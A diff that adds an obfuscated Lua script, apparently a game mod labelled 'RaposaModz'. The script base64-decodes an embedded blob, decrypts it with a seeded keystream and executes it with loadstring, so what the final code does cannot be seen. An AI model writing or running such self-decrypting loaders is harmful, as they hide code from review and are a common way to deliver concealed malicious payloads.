@@ -1,0 +1,32 @@
+-- RaposaModz | 9986882555
+return (function()
+local _d={}
+_d[1]="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"
+local _e=table.concat(_d)
+local _a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local _m={}
+for _i=1,#_a do _m[_a:sub(_i,_i)]=_i-1 end
+local _o={}
+for _i=1,#_e,4 do
+ local _x=_m[_e:sub(_i,_i)] or 0
+ local _y=_m[_e:sub(_i+1,_i+1)] or 0
+ local _z=_m[_e:sub(_i+2,_i+2)] or 0
+ local _w=_m[_e:sub(_i+3,_i+3)] or 0
+ local _n=_x*262144+_y*4096+_z*64+_w
+ _o[#_o+1]=string.char(math.floor(_n/65536)%256)
+ if _e:sub(_i+2,_i+2)~='=' then _o[#_o+1]=string.char(math.floor(_n/256)%256) end
+ if _e:sub(_i+3,_i+3)~='=' then _o[#_o+1]=string.char(_n%256) end
+end
+local _b=table.concat(_o)
+_o=nil; _d=nil; _e=nil
+local _s=1360635678
+local _r={}
+for _i=1,#_b do
+ _s=(_s*1664525+1013904223)%4294967296
+ _r[_i]=string.char((string.byte(_b,_i)-math.floor(_s/65536)%256)%256)
+end
+_b=nil
+local _f,_err=loadstring(table.concat(_r))
+if not _f then error('RaposaModz: falha ao compilar codigo ('..tostring(_err)..')') end
+return _f()
+end)()
